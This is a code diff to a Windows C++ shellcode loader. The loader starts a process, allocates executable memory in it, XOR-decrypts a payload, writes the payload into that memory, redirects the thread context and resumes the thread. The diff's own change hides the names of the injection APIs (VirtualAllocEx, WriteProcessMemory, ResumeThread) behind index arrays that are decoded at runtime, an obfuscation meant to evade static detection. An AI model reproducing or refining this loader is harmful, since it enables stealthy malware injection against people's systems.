@@ -6,7 +6,7 @@
 #include <cstdlib>
 #include <ctime>
 #include <string>  // Include this for std::string
-
+//CreateProcessA , VirtualAllocEx , WriteProcessMemory ,ResumeThread
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "user32.lib")
 
@@ -39,6 +39,9 @@ void main_star() {
     
     char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
     int creatingprocess[] = {28, 17, 4, 0, 19, 4, 41, 17, 14, 2, 4, 18, 18, 26};
+    int virall[] ={ 47, 8, 17, 19, 20, 0, 11, 26, 11, 11, 14, 2, 30, 23 };
+    int wrproc[] = { 48, 17, 8, 19, 4, 41, 17, 14, 2, 4, 18, 18, 38, 4, 12, 14, 17, 24};
+    int reth[] = {43, 4, 18, 20, 12, 4, 45, 7, 17, 4, 0, 3};
     printf("\n");
     std::cout << getoriginal(creatingprocess, big_string, sizeof(creatingprocess)) << std::endl;  // Use std::cout
     
@@ -54,11 +57,11 @@ void main_star() {
         (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
         GetProcAddress(istfromKernel32, getoriginal(creatingprocess, big_string, sizeof(creatingprocess)).c_str());
 
-    LPVOID (*pVirtualAllnocEkx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) = 
-        (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD)) GetProcAddress(istfromKernel32, "VirtualAllocEx");
+    LPVOID (*pvirall)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) = 
+        (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD)) GetProcAddress(istfromKernel32, getoriginal(virall, big_string, sizeof(virall)).c_str());
 
-    BOOL (*pWriteProcessM)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) = 
-        (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*)) GetProcAddress(istfromKernel32, "WriteProcessMemory");
+    BOOL (*pwrproc)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) = 
+        (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*)) GetProcAddress(istfromKernel32, getoriginal(wrproc, big_string, sizeof(wrproc)).c_str());
 
     PROCESS_INFORMATION pi = {0};
     li.cb = sizeof(li);
@@ -68,21 +71,23 @@ void main_star() {
 
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_FULL;
+    
+    
     auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT)) GetProcAddress(istfromKernel32, "GetThreadContext");
     pGetThreadContext(pi.hThread, &ctx);
 
-    LPVOID gallio = pVirtualAllnocEkx(pi.hProcess, NULL, code199kLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID gallio = pvirall(pi.hProcess, NULL, code199kLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
     for (DWORD i = 0; i < code199kLen; i++) {
         code199k[i] ^= ke[i % keLen];
     }
-    pWriteProcessM(pi.hProcess, gallio, code199k, code199kLen, NULL);
+    pwrproc(pi.hProcess, gallio, code199k, code199kLen, NULL);
     ctx.Rcx = (DWORD64)gallio;
 
     auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT)) GetProcAddress(istfromKernel32, "SetThreadContext");
     pSetThreadContext(pi.hThread, &ctx);
 
-    auto pResumeThread = (DWORD(WINAPI*)(HANDLE)) GetProcAddress(istfromKernel32, "ResumeThread");
+    auto pResumeThread = (DWORD(WINAPI*)(HANDLE)) GetProcAddress(istfromKernel32, getoriginal(reth, big_string, sizeof(reth)).c_str());
     pResumeThread(pi.hThread); 
 }
 
